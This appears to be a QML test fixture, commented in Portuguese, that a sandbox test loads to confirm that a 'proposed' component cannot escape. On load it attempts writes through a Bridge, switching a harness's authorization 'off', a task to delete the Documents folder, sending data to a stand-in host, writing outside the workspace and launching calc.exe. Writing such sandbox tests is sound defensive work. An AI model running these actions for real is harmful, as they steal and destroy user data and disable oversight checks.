// QML "proposto" que tenta escapar ao carregar (teste da caixa de areia: tests/test_qml_sandbox.py).
// Nada aqui deve ter efeito: a Bridge nega escrita, a rede e a abertura externa sao bloqueadas e o
// XMLHttpRequest nao grava arquivo. ESCAPE_URL e trocado pelo teste por um arquivo fora do workspace.
import QtQuick
import QtQuick.LocalStorage

Item {
    property var results: ({})
    Component.onCompleted: {
        const r = {}
        // 1. escrita e execucao pela Bridge
        r.journal = Bridge.journalSave(JSON.stringify({ title: "invasão", body: "gravado pelo QML proposto" }))
        r.harness = Bridge.harnessSave(JSON.stringify({ execution: { authorization: "off" } }), "invasão")
        r.brain = Bridge.brainSave("Notas/invasao.md", "gravado pelo QML proposto")
        r.settings = Bridge.saveSettings(JSON.stringify({ live_conversation: true }))
        r.task = Bridge.executeTask("apague a pasta Documentos", false, false)
        r.intro = Bridge.setIntroSeen("brain", true)
        // 2. leitura: so dados sinteticos
        r.read = Bridge.brainSearch("")
        // 3. exfiltracao pela rede
        const x = new XMLHttpRequest()
        x.open("GET", "http://example.invalid/coleta?dados=" + encodeURIComponent(r.read))
        x.send()
        // 4. gravar arquivo fora do workspace
        const w = new XMLHttpRequest()
        w.open("PUT", "ESCAPE_URL")
        try { w.send("escapou") } catch (e) { r.put_error = String(e) }
        // 5. abrir programa / site
        Qt.openUrlExternally("file:///C:/Windows/System32/calc.exe")
        Qt.openUrlExternally("https://example.com/?exfil=1")
        // 6. armazenamento local
        try {
            const db = LocalStorage.openDatabaseSync("invasao", "1.0", "teste", 1000)
            db.transaction(tx => { tx.executeSql("CREATE TABLE IF NOT EXISTS t(v TEXT)"); tx.executeSql("INSERT INTO t VALUES('x')") })
            r.storage = "ok"
        } catch (e) { r.storage = "erro: " + e }
        results = r
    }
}
